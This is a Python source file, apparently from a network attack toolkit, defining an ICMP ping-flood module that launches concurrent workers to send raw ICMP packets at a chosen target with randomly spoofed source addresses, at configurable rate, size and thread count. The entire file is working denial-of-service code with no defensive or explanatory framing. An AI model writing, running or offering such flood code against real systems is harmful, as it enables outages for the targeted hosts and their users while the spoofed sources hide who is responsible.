import asyncio
import random
from typing import Any

import structlog

from attack.base import BaseAttacker
from utils.packet import PacketCrafter

logger = structlog.get_logger(__name__)


class ICMPFloodAttack(BaseAttacker):
    name = "icmp_flood"
    description = "ICMP (ping) flood attack"

    async def run(
        self,
        target: str,
        rate: int = 1000,
        packet_size: int = 64,
        threads: int = 10,
        **kwargs: Any,
    ) -> None:
        if not PacketCrafter.PACKET_AVAILABLE:
            logger.error("scapy_required", message="ICMP flood requires scapy. Install with: pip install scapy")
            self.session.fail("scapy not available")
            return

        per_thread_rate = max(1, rate // threads)
        interval = 1.0 / per_thread_rate if per_thread_rate > 0 else 0.001

        async def worker() -> None:
            while not self.session.is_stopped:
                await self.session._pause_event.wait()
                src_ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
                pkt = PacketCrafter.craft_icmp(src_ip, target, payload_size=packet_size)
                if pkt and PacketCrafter.send_raw(pkt):
                    self.session.stats.packets_sent += 1
                    self.session.stats.bytes_sent += packet_size + 28
                else:
                    self.session.stats.errors += 1
                await asyncio.sleep(interval)

        tasks = [asyncio.create_task(worker()) for _ in range(threads)]

        try:
            await self.session.wait_for_stop()
        finally:
            for task in tasks:
                task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
